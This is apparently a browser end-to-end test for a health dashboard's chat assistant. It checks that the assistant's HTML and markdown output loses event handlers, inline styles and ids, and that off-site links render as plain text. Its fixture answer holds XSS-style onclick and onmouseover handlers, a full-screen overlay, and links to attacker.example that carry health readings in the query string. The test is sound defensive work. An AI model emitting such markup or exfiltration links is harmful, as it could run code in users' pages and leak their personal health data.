// Synthetic fixtures; no live account records.
// Model output is untrusted: raw HTML in an answer may not bring event handlers or inline styles
// into the page, however harmless the tag around them is. Text formatting and links on this site stay; a link elsewhere becomes plain text.
const assert = require('node:assert/strict');
const fx = require('../../frontend/preview/fixtures.cjs');
const { BASE, launch, run } = require('./lib.cjs');

const ANSWER = [
  '<p id="trap" onclick="window.umayUnsafe=true" style="position:fixed;inset:0;background:red">kapla</p>',
  '<strong onclick="window.umayUnsafe=true" style="color:red">kalın</strong>',
  '<a href="https://example.test/yol" onclick="window.umayUnsafe=true" style="color:red" title="başlık">dış bağlantı</a>',
  '[sızıntı](https://attacker.example/c?hrv=41&sleep=5h12) https://attacker.example/d?spo2=97',
  '<a href="/#/system" title="başlık">iç bağlantı</a>',
  '<ol start="3" onmouseover="window.umayUnsafe=true"><li>üç</li></ol>',
].join('\n\n');

run(async () => {
  const browser = await launch();
  try {
    const page = await browser.newPage({ viewport: { width: 1280, height: 900 } });
    await page.route('**/*', route => {
      const url = new URL(route.request().url());
      if (url.pathname === '/health') return route.fulfill({ json: fx.health });
      if (url.pathname === '/api/dashboard') return route.fulfill({ json: fx.dashboard(url.searchParams) });
      if (url.pathname === '/sync/status') return route.fulfill({ json: fx.syncStatus });
      if (/^\/(api|sync|auth|google-health)\//.test(url.pathname)) return route.fulfill({ status: 404, json: {} });
      return route.continue();
    });
    await page.addInitScript(() => {
      window.WebSocket = class {
        constructor() {
          window.umaySocket = this;
          setTimeout(() => this.onmessage?.({ data: JSON.stringify({ type: 'ready' }) }), 10);
        }
        send() {}
        close() {}
      };
    });
    await page.goto(BASE);
    await page.waitForFunction(() => document.querySelectorAll('#history-rows tr').length === 7);
    await page.locator('#assistant-open').click();
    await page.waitForFunction(() => document.querySelector('#assistant-status').dataset.presence === 'online');
    await page.evaluate(text => window.umaySocket.onmessage({ data: JSON.stringify({ type: 'message', id: 'a1', text }) }), ANSWER);
    await page.waitForFunction(() => document.querySelector('.chat-assistant .chat-content a[href]'));

    const result = await page.evaluate(() => {
      const content = document.querySelector('.chat-assistant .chat-content');
      const all = [...content.querySelectorAll('*'), content];
      const link = content.querySelector('a[href]');
      return {
        attributes: [...new Set(all.flatMap(el => el.getAttributeNames()))].sort(),
        handlers: all.flatMap(el => el.getAttributeNames().filter(name => name.startsWith('on'))).length,
        styled: content.querySelectorAll('[style]').length,
        id: content.querySelectorAll('[id]').length,
        strong: content.querySelector('strong')?.textContent,
        href: link.getAttribute('href'), target: link.getAttribute('target'), rel: link.getAttribute('rel'), title: link.getAttribute('title'),
        start: content.querySelector('ol')?.getAttribute('start'),
        links: [...content.querySelectorAll('a[href]')].map(el => el.getAttribute('href')),
        text: content.textContent,
      };
    });
    assert.equal(result.handlers, 0, `handlers survived: ${result.attributes}`);
    assert.equal(result.styled, 0, `style survived: ${result.attributes}`);
    assert.equal(result.id, 0, 'answers cannot claim element ids');
    assert.equal(result.strong, 'kalın', 'the formatting itself stays');
    assert.deepEqual(result.links, ['/#/system'], 'a link off this site loses its target');
    for (const words of ['dış bağlantı', 'sızıntı', 'iç bağlantı']) assert.ok(result.text.includes(words), `"${words}" stays as text`);
    assert.equal(result.href, '/#/system');
    assert.equal(result.target, '_blank');
    assert.equal(result.rel, 'noopener noreferrer');
    assert.equal(result.title, 'başlık');
    assert.equal(result.start, '3');

    await page.locator('.chat-assistant .chat-content p').first().click();
    await page.locator('.chat-assistant .chat-content strong').click();
    assert.equal(await page.evaluate(() => Boolean(window.umayUnsafe)), false, 'no answer markup can run code');
    console.log('PASS: event handlers and inline styles never reach the page; formatting and on-site links do; off-site links stay as text');
  } finally {
    await browser.close();
  }
});
